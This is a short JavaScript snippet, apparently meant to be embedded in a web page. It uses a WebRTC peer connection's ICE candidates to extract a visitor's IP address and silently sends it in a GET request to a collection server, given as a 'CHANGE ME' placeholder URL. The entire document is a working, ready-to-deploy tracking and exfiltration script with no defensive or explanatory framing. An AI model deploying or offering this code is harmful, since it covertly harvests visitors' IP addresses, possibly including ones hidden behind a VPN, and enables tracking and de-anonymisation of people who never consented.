// Set up variables
var IP;
var url = 'http://myserver.com/'; // CHANGE ME

// Get the WebRTC connection, if supported by the browser
window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection || false;

if (window.RTCPeerConnection) {
    // Create a connection
    var pc = new RTCPeerConnection({ iceServers: [] }), noop = function () { };
    pc.createDataChannel('');
    pc.createOffer(pc.setLocalDescription.bind(pc), noop);

    pc.onicecandidate = function (event) {
        if (event && event.candidate && event.candidate.candidate) {
            // Get the IP address
            var s = event.candidate.candidate.split('\n');
            IP = s[0].split(' ')[4];

            // Construct the payload to send to the server
            var payload = '?IP=' + IP;

            // Construct and send the request
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open("GET", url + payload, true);
            xmlHttp.send();
        }
    }
}